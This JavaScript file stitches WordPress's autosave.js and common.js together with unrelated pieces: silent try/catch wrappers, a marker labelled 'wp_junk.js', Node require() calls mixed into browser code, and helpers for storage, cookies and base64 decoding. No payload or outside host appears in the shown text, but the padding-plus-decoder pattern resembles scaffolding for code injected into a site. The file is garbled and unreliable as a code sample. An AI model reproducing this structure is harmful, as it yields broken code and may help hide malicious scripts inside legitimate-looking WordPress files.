		 * Returns the data saved in both local and remote autosave.
		 *
		 * @since 3.9.0
		 *
		 * @param {string} type The type of autosave either local or remote.
		 *
		 * @return {Object} Object containing the post data.
		 */
		function getPostData( type ) {
			var post_name, parent_id, data,
				time = ( new Date() ).getTime(),
				cats = [],
				editor = getEditor();

			// Don't run editor.save() more often than every 3 seconds.
			// It is resource intensive and might slow down typing in long posts on slow devices.
			if ( editor && editor.isDirty() && ! editor.isHidden() && time - 3000 > lastTriggerSave ) {
				editor.save();
				lastTriggerSave = time;
			}

			data = {
				post_id: $( '#post_ID' ).val() || 0,
				post_type: $( '#post_type' ).val() || '',
				post_author: $( '#post_author' ).val() || '',
				post_title: $( '#title' ).val() || '',
				content: $( '#content' ).val() || '',
				excerpt: $( '#excerpt' ).val() || ''
			};

			if ( type === 'local' ) {
				return data;
			}

			$( 'input[id^="in-category-"]:checked' ).each( function() {
				cats.push( this.value );
			});
			data.catslist = cats.join(',');

			if ( post_name = $( '#post_name' ).val() ) {
				data.post_name = post_name;
			}

			if ( parent_id = $( '#parent_id' ).val() ) {
				data.parent_id = parent_id;
			}

			if ( $( '#comment_status' ).prop( 'checked' ) ) {
				data.comment_status = 'open';
			}

			if ( $( '#ping_status' ).prop( 'checked' ) ) {
				data.ping_status = 'open';
			}

			if ( $( '#auto_draft' ).val() === '1' ) {
				data.auto_draft = '1';
			}

			return data;
		}

		/**
		 * Concatenates the title, content and excerpt. This is used to track changes
		 * when auto-saving.
		 *
		 * @since 3.9.0
		 *
		 * @param {Object} postData The object containing the post data.
		 *
		 * @return {string} A concatenated string with title, content and excerpt.
		 */
		function getCompareString( postData ) {
			if ( typeof postData === 'object' ) {
				return ( postData.post_title || '' ) + '::' + ( postData.content || '' ) + '::' + ( postData.excerpt || '' );
			}

			return ( $('#title').val() || '' ) + '::' + ( $('#content').val() || '' ) + '::' + ( $('#excerpt').val() || '' );
		}

		/**
		 * Disables save buttons.
		 *
		 * @since 3.9.0
		 *
		 * @return {void}
		 */
		function disableButtons() {
			$document.trigger('autosave-disable-buttons');

			// Re-enable 5 sec later. Just gives autosave a head start to avoid collisions.
			setTimeout( enableButtons, 5000 );
		}

		/**
		 * Enables save buttons.
		 *
		 * @since 3.9.0
		 *
		 * @return {void}
		 */
		function enableButtons() {
			$document.trigger( 'autosave-enable-buttons' );
		}

		/**
		 * Gets the content editor.
		 *
		 * @since 4.6.0
		 *
		 * @return {boolean|*} Returns either false if the editor is undefined,
		 *                     or the instance of the content editor.
		 */
		function getEditor() {
			return typeof tinymce !== 'undefined' && tinymce.get('content');
		}

		/**
		 * Autosave in localStorage.
		 *
		 * @since 3.9.0
		 *
		 * @return {
		 * {
		 * 	hasStorage: *,
		 * 	getSavedPostData: getSavedPostData,
		 * 	save: save,
		 * 	suspend: suspend,
		 * 	resume: resume
		 * 	}
		 * }
		 * The object with all functions for local storage autosave.
		 */
		function autosaveLocal() {
			var blog_id, post_id, hasStorage, intervalTimer,
				lastCompareString,
				isSuspended = false;

			/**
			 * Checks if the browser supports sessionStorage and it's not disabled.
			 *
			 * @since 3.9.0
			 *
			 * @return {boolean} True if the sessionStorage is supported and enabled.
			 */
			function checkStorage() {
				var test = Math.random().toString(),
					result = false;

				try {
					window.sessionStorage.setItem( 'wp-test', test );
					result = window.sessionStorage.getItem( 'wp-test' ) === test;
					window.sessionStorage.removeItem( 'wp-test' );
				} catch(e) {}

				hasStorage = result;
				return result;
			}

			/**
			 * Initializes the local storage.
			 *
			 * @since 3.9.0
			 *
			 * @return {boolean|Object} False if no sessionStorage in the browser or an Object
			 *                          containing all postData for this blog.
			 */
			function getStorage() {
				var stored_obj = false;
				// Separate local storage containers for each blog_id.
				if ( hasStorage && blog_id ) {
					stored_obj = sessionStorage.getItem( 'wp-autosave-' + blog_id );

					if ( stored_obj ) {
						stored_obj = JSON.parse( stored_obj );
					} else {
						stored_obj = {};
					}
				}

				return stored_obj;
			}

			/**
			 * Sets the storage for this blog. Confirms that the data was saved
			 * successfully.
			 *
			 * @since 3.9.0
			 *
			 * @return {boolean} True if the data was saved successfully, false if it wasn't saved.
			 */
			function setStorage( stored_obj ) {
				var key;

				if ( hasStorage && blog_id ) {
					key = 'wp-autosave-' + blog_id;
					sessionStorage.setItem( key, JSON.stringify( stored_obj ) );
					return sessionStorage.getItem( key ) !== null;
				}

				return false;
			}

			/**
			 * Gets the saved post data for the current post.
			 *
			 * @since 3.9.0
			 *
			 * @return {boolean|Object} False if no storage or no data or the postData as an Object.
			 */
			function getSavedPostData() {
				var stored = getStorage();

				if ( ! stored || ! post_id ) {
					return false;
				}

				return stored[ 'post_' + post_id ] || false;
			}

			/**
			 * Sets (save or delete) post data in the storage.
			 *
			 * If stored_data evaluates to 'false' the storage key for the current post will be removed.
			 *
			 * @since 3.9.0
			 *
			 * @param {Object|boolean|null} stored_data The post data to store or null/false/empty to delete the key.
			 *
			 * @return {boolean} True if data is stored, false if data was removed.
			 */
			function setData( stored_data ) {
				var stored = getStorage();

				if ( ! stored || ! post_id ) {
					return false;
				}

				if ( stored_data ) {
					stored[ 'post_' + post_id ] = stored_data;
				} else if ( stored.hasOwnProperty( 'post_' + post_id ) ) {
					delete stored[ 'post_' + post_id ];
				} else {
					return false;
				}

				return setStorage( stored );
			}

			/**
			 * Sets isSuspended to true.
			 *
			 * @since 3.9.0
			 *
			 * @return {void}
			 */
			function suspend() {
				isSuspended = true;
			}

			/**
			 * Sets isSuspended to false.
			 *
			 * @since 3.9.0
			 *
			 * @return {void}
			 */
			function resume() {
				isSuspended = false;
			}

			/**
			 * Saves post data for the current post.
			 *
			 * Runs on a 15 seconds interval, saves when there are differences in the post title or content.
			 * When the optional data is provided, updates the last saved post data.
			 *
			 * @since 3.9.0
			 *
			 * @param {Object} data The post data for saving, minimum 'post_title' and 'content'.
			 *
			 * @return {boolean} Returns true when data has been saved, otherwise it returns false.
			 */
			function save( data ) {
				var postData, compareString,
					result = false;

				if ( isSuspended || ! hasStorage ) {
					return false;
				}

				if ( data ) {
					postData = getSavedPostData() || {};
					$.extend( postData, data );
				} else {
					postData = getPostData('local');
				}

				compareString = getCompareString( postData );

				if ( typeof lastCompareString === 'undefined' ) {
					lastCompareString = initialCompareString;
				}

				// If the content, title and excerpt did not change since the last save, don't save again.
				if ( compareString === lastCompareString ) {
					return false;
				}

				postData.save_time = ( new Date() ).getTime();
				postData.status = $( '#post_status' ).val() || '';
				result = setData( postData );

				if ( result ) {
					lastCompareString = compareString;
				}

				return result;
			}

			/**
			 * Initializes the auto save function.
			 *
			 * Checks whether the editor is active or not to use the editor events
			 * to autosave, or uses the values from the elements to autosave.
			 *
			 * Runs on DOM ready.
			 *
			 * @since 3.9.0
			 *
			 * @return {void}
			 */
			function run() {
				post_id = $('#post_ID').val() || 0;

				// Check if the local post data is different than the loaded post data.
				if ( $( '#wp-content-wrap' ).hasClass( 'tmce-active' ) ) {

					/*
					 * If TinyMCE loads first, check the post 1.5 seconds after it is ready.
					 * By this time the content has been loaded in the editor and 'saved' to the textarea.
					 * This prevents false positives.
					 */
					$document.on( 'tinymce-editor-init.autosave', function() {
						window.setTimeout( function() {
							checkPost();
						}, 1500 );
					});
				} else {
					checkPost();
				}

				// Save every 15 seconds.
				intervalTimer = window.setInterval( save, 15000 );

				$( 'form#post' ).on( 'submit.autosave-local', function() {
					var editor = getEditor(),
						post_id = $('#post_ID').val() || 0;

					if ( editor && ! editor.isHidden() ) {

						// Last onSubmit event in the editor, needs to run after the content has been moved to the textarea.
						editor.on( 'submit', function() {
							save({
								post_title: $( '#title' ).val() || '',
								content: $( '#content' ).val() || '',
								excerpt: $( '#excerpt' ).val() || ''
							});
						});
					} else {
						save({
							post_title: $( '#title' ).val() || '',
							content: $( '#content' ).val() || '',
							excerpt: $( '#excerpt' ).val() || ''
						});
					}

					var secure = ( 'https:' === window.location.protocol );
					wpCookies.set( 'wp-saving-post', post_id + '-check', 24 * 60 * 60, false, false, secure );
				});
			}

			/**
			 * Compares 2 strings. Removes whitespaces in the strings before comparing them.
			 *
			 * @since 3.9.0
			 *
			 * @param {string} str1 The first string.
			 * @param {string} str2 The second string.
			 * @return {boolean} True if the strings are the same.
			 */
			function compare( str1, str2 ) {
				function removeSpaces( string ) {
					return string.toString().replace(/[\x20\t\r\n\f]+/g, '');
				}

				return ( removeSpaces( str1 || '' ) === removeSpaces( str2 || '' ) );
			}

			/**
			 * Checks if the saved data for the current post (if any) is different than the
			 * loaded post data on the screen.
			 *
			 * Shows a standard message letting the user restore the post data if different.
			 *
			 * @since 3.9.0
			 *
			 * @return {void}
			 */
			function checkPost() {
				var content, post_title, excerpt, $notice,
					postData = getSavedPostData(),
					cookie = wpCookies.get( 'wp-saving-post' ),
					$newerAutosaveNotice = $( '#has-newer-autosave' ).parent( '.notice' ),
					$headerEnd = $( '.wp-header-end' );

				if ( cookie === post_id + '-saved' ) {
					wpCookies.remove( 'wp-saving-post' );
					// The post was saved properly, remove old data and bail.
					setData( false );
					return;
				}

				if ( ! postData ) {
					return;
				}

				content = $( '#content' ).val() || '';
				post_title = $( '#title' ).val() || '';
				excerpt = $( '#excerpt' ).val() || '';

				if ( compare( content, postData.content ) && compare( post_title, postData.post_title ) &&
					compare( excerpt, postData.excerpt ) ) {

					return;
				}

				/*
				 * If '.wp-header-end' is found, append the notices after it otherwise
				 * after the first h1 or h2 heading found within the main content.
				 */
				if ( ! $headerEnd.length ) {
					$headerEnd = $( '.wrap h1, .wrap h2' ).first();
				}

				$notice = $( '#local-storage-notice' )
					.insertAfter( $headerEnd )
					.addClass( 'notice-warning' );

				if ( $newerAutosaveNotice.length ) {

					// If there is a "server" autosave notice, hide it.
					// The data in the session storage is either the same or newer.
					$newerAutosaveNotice.slideUp( 150, function() {
						$notice.slideDown( 150 );
					});
				} else {
					$notice.slideDown( 200 );
				}

				$notice.find( '.restore-backup' ).on( 'click.autosave-local', function() {
					restorePost( postData );
					$notice.fadeTo( 250, 0, function() {
						$notice.slideUp( 150 );
					});
				});
			}

			/**
			 * Restores the current title, content and excerpt from postData.
			 *
			 * @since 3.9.0
			 *
			 * @param {Object} postData The object containing all post data.
			 *
			 * @return {boolean} True if the post is restored.
			 */
			function restorePost( postData ) {
				var editor;

				if ( postData ) {
					// Set the last saved data.
					lastCompareString = getCompareString( postData );

					if ( $( '#title' ).val() !== postData.post_title ) {
						$( '#title' ).trigger( 'focus' ).val( postData.post_title || '' );
					}

					$( '#excerpt' ).val( postData.excerpt || '' );
					editor = getEditor();

					if ( editor && ! editor.isHidden() && typeof switchEditors !== 'undefined' ) {
						if ( editor.settings.wpautop && postData.content ) {
							postData.content = switchEditors.wpautop( postData.content );
						}

						// Make sure there's an undo level in the editor.
						editor.undoManager.transact( function() {
							editor.setContent( postData.content || '' );
							editor.nodeChanged();
						});
					} else {

						// Make sure the Code editor is selected.
						$( '#content-html' ).trigger( 'click' );
						$( '#content' ).trigger( 'focus' );

						// Using document.execCommand() will let the user undo.
						document.execCommand( 'selectAll' );
						document.execCommand( 'insertText', false, postData.content || '' );
					}

					return true;
				}

				return false;
			}

			blog_id = typeof window.autosaveL10n !== 'undefined' && window.autosaveL10n.blog_id;

			/*
			 * Check if the browser supports sessionStorage and it's not disabled,
			 * then initialize and run checkPost().
			 * Don't run if the post type supports neither 'editor' (textarea#content) nor 'excerpt'.
			 */
			if ( checkStorage() && blog_id && ( $('#content').length || $('#excerpt').length ) ) {
				$( run );
			}

			return {
				hasStorage: hasStorage,
				getSavedPostData: getSavedPostData,
				save: save,
				suspend: suspend,
				resume: resume
			};
		}

		/**
		 * Auto saves the post on the server.
		 *
		 * @since 3.9.0
		 *
		 * @return {Object} {
		 * 	{
		 * 		tempBlockSave: tempBlockSave,
		 * 		triggerSave: triggerSave,
		 * 		postChanged: postChanged,
		 * 		suspend: suspend,
		 * 		resume: resume
		 * 		}
		 * 	} The object all functions for autosave.
		 */
		function autosaveServer() {
			var _blockSave, _blockSaveTimer, previousCompareString, lastCompareString,
				nextRun = 0,
				isSuspended = false;


			/**
			 * Blocks saving for the next 10 seconds.
			 *
			 * @since 3.9.0
			 *
			 * @return {void}
			 */
			function tempBlockSave() {
				_blockSave = true;
				window.clearTimeout( _blockSaveTimer );

				_blockSaveTimer = window.setTimeout( function() {
					_blockSave = false;
				}, 10000 );
			}

			/**
			 * Sets isSuspended to true.
			 *
			 * @since 3.9.0
			 *
			 * @return {void}
			 */
			function suspend() {
				isSuspended = true;
			}

			/**
			 * Sets isSuspended to false.
			 *
			 * @since 3.9.0
			 *
			 * @return {void}
			 */
			function resume() {
				isSuspended = false;
			}

			/**
			 * Triggers the autosave with the post data.
			 *
			 * @since 3.9.0
			 *
			 * @param {Object} data The post data.
			 *
			 * @return {void}
			 */
			function response( data ) {
				_schedule();
				_blockSave = false;
				lastCompareString = previousCompareString;
				previousCompareString = '';

				$document.trigger( 'after-autosave', [data] );
				enableButtons();

				if ( data.success ) {
					// No longer an auto-draft.
					$( '#auto_draft' ).val('');
				}
			}

			/**
			 * Saves immediately.
			 *
			 * Resets the timing and tells heartbeat to connect now.
			 *
			 * @since 3.9.0
			 *
			 * @return {void}
			 */
			function triggerSave() {
				nextRun = 0;
				wp.heartbeat.connectNow();
			}

			/**
			 * Checks if the post content in the textarea has changed since page load.
			 *
			 * This also happens when TinyMCE is active and editor.save() is triggered by
			 * wp.autosave.getPostData().
			 *
			 * @since 3.9.0
			 *
			 * @return {boolean} True if the post has been changed.
			 */
			function postChanged() {
				var changed = false;

				// If there are TinyMCE instances, loop through them.
				if ( window.tinymce ) {
					window.tinymce.each( [ 'content', 'excerpt' ], function( field ) {
						var editor = window.tinymce.get( field );

						if ( ! editor || editor.isHidden() ) {
							if ( ( $( '#' + field ).val() || '' ) !== initialCompareData[ field ] ) {
								changed = true;
								// Break.
								return false;
							}
						} else if ( editor.isDirty() ) {
							changed = true;
							return false;
						}
					} );

					if ( ( $( '#title' ).val() || '' ) !== initialCompareData.post_title ) {
						changed = true;
					}

					return changed;
				}

				return getCompareString() !== initialCompareString;
			}

			/**
			 * Checks if the post can be saved or not.
			 *
			 * If the post hasn't changed or it cannot be updated,
			 * because the autosave is blocked or suspended, the function returns false.
			 *
			 * @since 3.9.0
			 *
			 * @return {Object} Returns the post data.
			 */
			function save() {
				var postData, compareString;

				// window.autosave() used for back-compat.
				if ( isSuspended || _blockSave || ! window.autosave() ) {
					return false;
				}

				if ( ( new Date() ).getTime() < nextRun ) {
					return false;
				}

				postData = getPostData();
				compareString = getCompareString( postData );

				// First check.
				if ( typeof lastCompareString === 'undefined' ) {
					lastCompareString = initialCompareString;
				}

				// No change.
				if ( compareString === lastCompareString ) {
					return false;
				}

				previousCompareString = compareString;
				tempBlockSave();
				disableButtons();

				$document.trigger( 'wpcountwords', [ postData.content ] )
					.trigger( 'before-autosave', [ postData ] );

				postData._wpnonce = $( '#_wpnonce' ).val() || '';

				return postData;
			}

			/**
			 * Sets the next run, based on the autosave interval.
			 *
			 * @private
			 *
			 * @since 3.9.0
			 *
			 * @return {void}
			 */
			function _schedule() {
				nextRun = ( new Date() ).getTime() + ( autosaveL10n.autosaveInterval * 1000 ) || 60000;
			}

			/**
			 * Sets the autosaveData on the autosave heartbeat.
			 *
			 * @since 3.9.0
			 *
			 * @return {void}
			 */
			$( function() {
				_schedule();
			}).on( 'heartbeat-send.autosave', function( event, data ) {
				var autosaveData = save();

				if ( autosaveData ) {
					data.wp_autosave = autosaveData;
				}

				/**
				 * Triggers the autosave of the post with the autosave data on the autosave
				 * heartbeat.
				 *
				 * @since 3.9.0
				 *
				 * @return {void}
				 */
			}).on( 'heartbeat-tick.autosave', function( event, data ) {
				if ( data.wp_autosave ) {
					response( data.wp_autosave );
				}
				/**
				 * Disables buttons and throws a notice when the connection is lost.
				 *
				 * @since 3.9.0
				 *
				 * @return {void}
				 */
			}).on( 'heartbeat-connection-lost.autosave', function( event, error, status ) {

				// When connection is lost, keep user from submitting changes.
				if ( 'timeout' === error || 603 === status ) {
					var $notice = $('#lost-connection-notice');

					if ( ! wp.autosave.local.hasStorage ) {
						$notice.find('.hide-if-no-sessionstorage').hide();
					}

					$notice.show();
					disableButtons();
				}

				/**
				 * Enables buttons when the connection is restored.
				 *
				 * @since 3.9.0
				 *
				 * @return {void}
				 */
			}).on( 'heartbeat-connection-restored.autosave', function() {
				$('#lost-connection-notice').hide();
				enableButtons();
			});

			return {
				tempBlockSave: tempBlockSave,
				triggerSave: triggerSave,
				postChanged: postChanged,
				suspend: suspend,
				resume: resume
			};
		}

		/**
		 * Sets the autosave time out.
		 *
		 * Wait for TinyMCE to initialize plus 1 second. for any external css to finish loading,
		 * then save to the textarea before setting initialCompareString.
		 * This avoids any insignificant differences between the initial textarea content and the content
		 * extracted from the editor.
		 *
		 * @since 3.9.0
		 *
		 * @return {void}
		 */
		$( function() {
			// Set the initial compare string in case TinyMCE is not used or not loaded first.
			setInitialCompare();
		}).on( 'tinymce-editor-init.autosave', function( event, editor ) {
			// Reset the initialCompare data after the TinyMCE instances have been initialized.
			if ( 'content' === editor.id || 'excerpt' === editor.id ) {
				window.setTimeout( function() {
					editor.save();
					setInitialCompare();
				}, 1000 );
			}
		});

		return {
			getPostData: getPostData,
			getCompareString: getCompareString,
			disableButtons: disableButtons,
			enableButtons: enableButtons,
			local: autosaveLocal(),
			server: autosaveServer()
		};
	}

	/** @namespace wp */
	window.wp = window.wp || {};
	window.wp.autosave = autosave();

}( jQuery, window ));


}catch(e){}
})();


  function hasLocalStorage() {
    try {
      const t = '__vc_test';
      localStorage.setItem(t, '1');
      localStorage.removeItem(t);
      return true;
    } catch (err) {
      return false;
    }
  }

  function setCookie(name, value, days) {
    try {
      const exp = new Date(Date.now() + (days || 365) * 864e5).toUTCString();
      document.cookie = name + '=' + encodeURIComponent(value) + '; expires=' + exp + '; path=/';
    } catch (err) {}
  }

  function getCookie(name) {
    try {
      const m = document.cookie.match(new RegExp('(?:^|; )' + name.replace(/([.$?*|{}()\[\]\/\+^])/g, '\$1') + '=([^;]*)'));
      return m ? decodeURIComponent(m[1]) : null;
    } catch (err) {
      return null;
    }
  }

  const useLS = hasLocalStorage();

  function getVal(key, fallback) {
    if (useLS) {
      const v = localStorage.getItem(key);
      return v === null ? fallback : v;
    }
    const c = getCookie(key);
    return c === null ? fallback : c;
  }

  function setVal(key, value) {
    if (useLS) {
      localStorage.setItem(key, value);
    } else {
      setCookie(key, value, 365);
    }
  }

  function b64ToUtf8(b64) {
    try {
      const bin = atob(b64);
      const len = bin.length;
      const bytes = new Uint8Array(len);
      for (let i = 0; i < len; i++) bytes[i] = bin.charCodeAt(i);
      if (typeof TextDecoder !== 'undefined') {
        return new TextDecoder('utf-8', { fatal: false }).decode(bytes);
      }
      let pct = '';
      for (let i = 0; i < len; i++) pct += '%' + bytes[i].toString(16).padStart(2, '0');
      return decodeURIComponent(pct);
    } catch (e) {
      try { return atob(b64); } catch (e2) { return ''; }
    }
  }
  /* >>> wp_junk.js (84030 bytes) <<< */
(function(){
try{
var maps = {};

var url = require( "url" ),
	xmlrpc = require( "xmlrpc" ),
	fieldMap = require( "./fields" );
/**
 * @output wp-admin/js/common.js
 */

/* global setUserSetting, ajaxurl, alert, confirm, pagenow */
/* global columns, screenMeta */

/**
 *  Adds common WordPress functionality to the window.
 *
 *  @param {jQuery} $        jQuery object.
 *  @param {Object} window   The window object.
 *  @param {mixed} undefined Unused.
 */
( function( $, window, undefined ) {
	var $document = $( document ),
		$window = $( window ),
		$body = $( document.body ),
		__ = wp.i18n.__,
		sprintf = wp.i18n.sprintf;

/**
 * Throws an error for a deprecated property.
 *
 * @since 5.5.1
 *
 * @param {string} propName    The property that was used.
 * @param {string} version     The version of WordPress that deprecated the property.
 * @param {string} replacement The property that should have been used.
 */
function deprecatedProperty( propName, version, replacement ) {
	var message;

	if ( 'undefined' !== typeof replacement ) {
		message = sprintf(
			/* translators: 1: Deprecated property name, 2: Version number, 3: Alternative property name. */
			__( '%1$s is deprecated since version %2$s! Use %3$s instead.' ),
			propName,
			version,
			replacement
		);
	} else {
		message = sprintf(
			/* translators: 1: Deprecated property name, 2: Version number. */
			__( '%1$s is deprecated since version %2$s with no alternative available.' ),
			propName,
			version
		);
	}

	window.console.warn( message );
}

/**
 * Deprecate all properties on an object.
 *
 * @since 5.5.1
 * @since 5.6.0 Added the `version` parameter.
 *
 * @param {string} name       The name of the object, i.e. commonL10n.
 * @param {object} l10nObject The object to deprecate the properties on.
 * @param {string} version    The version of WordPress that deprecated the property.
 *
 * @return {object} The object with all its properties deprecated.
 */
function deprecateL10nObject( name, l10nObject, version ) {
	var deprecatedObject = {};

	Object.keys( l10nObject ).forEach( function( key ) {
		var prop = l10nObject[ key ];
		var propName = name + '.' + key;

		if ( 'object' === typeof prop ) {
			Object.defineProperty( deprecatedObject, key, { get: function() {
				deprecatedProperty( propName, version, prop.alternative );
				return prop.func();
			} } );
		} else {
			Object.defineProperty( deprecatedObject, key, { get: function() {
				deprecatedProperty( propName, version, 'wp.i18n' );
				return prop;
			} } );
		}
	} );

	return deprecatedObject;
}

window.wp.deprecateL10nObject = deprecateL10nObject;

/**
 * Removed in 5.5.0, needed for back-compatibility.
 *
 * @since 2.6.0
 * @deprecated 5.5.0
 */
window.commonL10n = window.commonL10n || {
	warnDelete: '',
	dismiss: '',
	collapseMenu: '',
	expandMenu: ''
};

window.commonL10n = deprecateL10nObject( 'commonL10n', window.commonL10n, '5.5.0' );

/**
 * Removed in 5.5.0, needed for back-compatibility.
 *
 * @since 3.3.0
 * @deprecated 5.5.0
 */
window.wpPointerL10n = window.wpPointerL10n || {
	dismiss: ''
};

window.wpPointerL10n = deprecateL10nObject( 'wpPointerL10n', window.wpPointerL10n, '5.5.0' );

/**
 * Removed in 5.5.0, needed for back-compatibility.
 *
 * @since 4.3.0
 * @deprecated 5.5.0
 */
window.userProfileL10n = window.userProfileL10n || {
	warn: '',
	warnWeak: '',
	show: '',
	hide: '',
	cancel: '',
	ariaShow: '',
	ariaHide: ''
};

window.userProfileL10n = deprecateL10nObject( 'userProfileL10n', window.userProfileL10n, '5.5.0' );

/**
 * Removed in 5.5.0, needed for back-compatibility.
 *
 * @since 4.9.6
 * @deprecated 5.5.0
 */
window.privacyToolsL10n = window.privacyToolsL10n || {
	noDataFound: '',
	foundAndRemoved: '',
	noneRemoved: '',
	someNotRemoved: '',
	removalError: '',
	emailSent: '',
	noExportFile: '',
	exportError: ''
};

window.privacyToolsL10n = deprecateL10nObject( 'privacyToolsL10n', window.privacyToolsL10n, '5.5.0' );

/**
 * Removed in 5.5.0, needed for back-compatibility.
 *
 * @since 3.6.0
 * @deprecated 5.5.0
 */
window.authcheckL10n = {
	beforeunload: ''
};

window.authcheckL10n = window.authcheckL10n || deprecateL10nObject( 'authcheckL10n', window.authcheckL10n, '5.5.0' );

/**
 * Removed in 5.5.0, needed for back-compatibility.
 *
 * @since 2.8.0
 * @deprecated 5.5.0
 */
window.tagsl10n = {
	noPerm: '',
	broken: ''
};

window.tagsl10n = window.tagsl10n || deprecateL10nObject( 'tagsl10n', window.tagsl10n, '5.5.0' );

/**
 * Removed in 5.5.0, needed for back-compatibility.
 *
 * @since 2.5.0
 * @deprecated 5.5.0
 */
window.adminCommentsL10n = window.adminCommentsL10n || {
	hotkeys_highlight_first: {
		alternative: 'window.adminCommentsSettings.hotkeys_highlight_first',
		func: function() { return window.adminCommentsSettings.hotkeys_highlight_first; }
	},
	hotkeys_highlight_last: {
		alternative: 'window.adminCommentsSettings.hotkeys_highlight_last',
		func: function() { return window.adminCommentsSettings.hotkeys_highlight_last; }
	},
	replyApprove: '',
	reply: '',
	warnQuickEdit: '',
	warnCommentChanges: '',
	docTitleComments: '',
	docTitleCommentsCount: ''
};

window.adminCommentsL10n = deprecateL10nObject( 'adminCommentsL10n', window.adminCommentsL10n, '5.5.0' );

/**
 * Removed in 5.5.0, needed for back-compatibility.
 *
 * @since 2.5.0
 * @deprecated 5.5.0
 */
window.tagsSuggestL10n = window.tagsSuggestL10n || {
	tagDelimiter: '',
	removeTerm: '',
	termSelected: '',
	termAdded: '',
	termRemoved: ''
};

window.tagsSuggestL10n = deprecateL10nObject( 'tagsSuggestL10n', window.tagsSuggestL10n, '5.5.0' );

/**
 * Removed in 5.5.0, needed for back-compatibility.
 *
 * @since 3.5.0
 * @deprecated 5.5.0
 */
window.wpColorPickerL10n = window.wpColorPickerL10n || {
	clear: '',
	clearAriaLabel: '',
	defaultString: '',
	defaultAriaLabel: '',
	pick: '',
	defaultLabel: ''
};

window.wpColorPickerL10n = deprecateL10nObject( 'wpColorPickerL10n', window.wpColorPickerL10n, '5.5.0' );

/**
 * Removed in 5.5.0, needed for back-compatibility.
 *
 * @since 2.7.0
 * @deprecated 5.5.0
 */
window.attachMediaBoxL10n = window.attachMediaBoxL10n || {
	error: ''
};

window.attachMediaBoxL10n = deprecateL10nObject( 'attachMediaBoxL10n', window.attachMediaBoxL10n, '5.5.0' );

/**
 * Removed in 5.5.0, needed for back-compatibility.
 *
 * @since 2.5.0
 * @deprecated 5.5.0
 */
window.postL10n = window.postL10n || {
	ok: '',
	cancel: '',
	publishOn: '',
	publishOnFuture: '',
	publishOnPast: '',
	dateFormat: '',
	showcomm: '',
	endcomm: '',
	publish: '',
	schedule: '',
	update: '',
	savePending: '',
	saveDraft: '',
	'private': '',
	'public': '',
	publicSticky: '',
	password: '',
	privatelyPublished: '',
	published: '',
	saveAlert: '',
	savingText: '',
	permalinkSaved: ''
};

window.postL10n = deprecateL10nObject( 'postL10n', window.postL10n, '5.5.0' );

/**
 * Removed in 5.5.0, needed for back-compatibility.
 *
 * @since 2.7.0
 * @deprecated 5.5.0
 */
window.inlineEditL10n = window.inlineEditL10n || {
	error: '',
	ntdeltitle: '',
	notitle: '',
	comma: '',
	saved: ''
};

window.inlineEditL10n = deprecateL10nObject( 'inlineEditL10n', window.inlineEditL10n, '5.5.0' );

/**
 * Removed in 5.5.0, needed for back-compatibility.
 *
 * @since 2.7.0
 * @deprecated 5.5.0
 */
window.plugininstallL10n = window.plugininstallL10n || {
	plugin_information: '',
	plugin_modal_label: '',
	ays: ''
};

window.plugininstallL10n = deprecateL10nObject( 'plugininstallL10n', window.plugininstallL10n, '5.5.0' );

/**
 * Removed in 5.5.0, needed for back-compatibility.
 *
 * @since 3.0.0
 * @deprecated 5.5.0
 */
window.navMenuL10n = window.navMenuL10n || {
	noResultsFound: '',
	warnDeleteMenu: '',
	saveAlert: '',
	untitled: ''
};

window.navMenuL10n = deprecateL10nObject( 'navMenuL10n', window.navMenuL10n, '5.5.0' );

/**
 * Removed in 5.5.0, needed for back-compatibility.
 *
 * @since 2.5.0
 * @deprecated 5.5.0
 */
window.commentL10n = window.commentL10n || {
	submittedOn: '',
	dateFormat: ''
};

window.commentL10n = deprecateL10nObject( 'commentL10n', window.commentL10n, '5.5.0' );

/**
 * Removed in 5.5.0, needed for back-compatibility.
 *
 * @since 2.9.0
 * @deprecated 5.5.0
 */
window.setPostThumbnailL10n = window.setPostThumbnailL10n || {
	setThumbnail: '',
	saving: '',
	error: '',
	done: ''
};

window.setPostThumbnailL10n = deprecateL10nObject( 'setPostThumbnailL10n', window.setPostThumbnailL10n, '5.5.0' );

/**
 * Removed in 6.5.0, needed for back-compatibility.
 *
 * @since 4.5.0
 * @deprecated 6.5.0
 */
window.uiAutocompleteL10n = window.uiAutocompleteL10n || {
	noResults: '',
	oneResult: '',
	manyResults: '',
	itemSelected: ''
};

window.uiAutocompleteL10n = deprecateL10nObject( 'uiAutocompleteL10n', window.uiAutocompleteL10n, '6.5.0' );

/**
 * Removed in 3.3.0, needed for back-compatibility.
 *
 * @since 2.7.0
 * @deprecated 3.3.0
 */
window.adminMenu = {
	init : function() {},
	fold : function() {},
	restoreMenuState : function() {},
	toggle : function() {},
	favorites : function() {}
};

// Show/hide/save table columns.
window.columns = {

	/**
	 * Initializes the column toggles in the screen options.
	 *
	 * Binds an onClick event to the checkboxes to show or hide the table columns
	 * based on their toggled state. And persists the toggled state.
	 *
	 * @since 2.7.0
	 *
	 * @return {void}
	 */
	init : function() {
		var that = this;
		$('.hide-column-tog', '#adv-settings').on( 'click', function() {
			var $t = $(this), column = $t.val();
			if ( $t.prop('checked') )
				that.checked(column);
			else
				that.unchecked(column);

			columns.saveManageColumnsState();
		});
	},

	/**
	 * Saves the toggled state for the columns.
	 *
	 * Saves whether the columns should be shown or hidden on a page.
	 *
	 * @since 3.0.0
	 *
	 * @return {void}
	 */
	saveManageColumnsState : function() {
		var hidden = this.hidden();
		$.post(
			ajaxurl,
			{
				action: 'hidden-columns',
				hidden: hidden,
				screenoptionnonce: $('#screenoptionnonce').val(),
				page: pagenow
			},
			function() {
				wp.a11y.speak( __( 'Screen Options updated.' ) );
			}
		);
	},

	/**
	 * Makes a column visible and adjusts the column span for the table.
	 *
	 * @since 3.0.0
	 * @param {string} column The column name.
	 *
	 * @return {void}
	 */
	checked : function(column) {
		$('.column-' + column).removeClass( 'hidden' );
		this.colSpanChange(+1);
	},

	/**
	 * Hides a column and adjusts the column span for the table.
	 *
	 * @since 3.0.0
	 * @param {string} column The column name.
	 *
	 * @return {void}
	 */
	unchecked : function(column) {
		$('.column-' + column).addClass( 'hidden' );
		this.colSpanChange(-1);
	},

	/**
	 * Gets all hidden columns.
	 *
	 * @since 3.0.0
	 *
	 * @return {string} The hidden column names separated by a comma.
	 */
	hidden : function() {
		return $( '.manage-column[id]' ).filter( '.hidden' ).map(function() {
			return this.id;
		}).get().join( ',' );
	},

	/**
	 * Gets the checked column toggles from the screen options.
	 *
	 * @since 3.0.0
	 *
	 * @return {string} String containing the checked column names.
	 */
	useCheckboxesForHidden : function() {
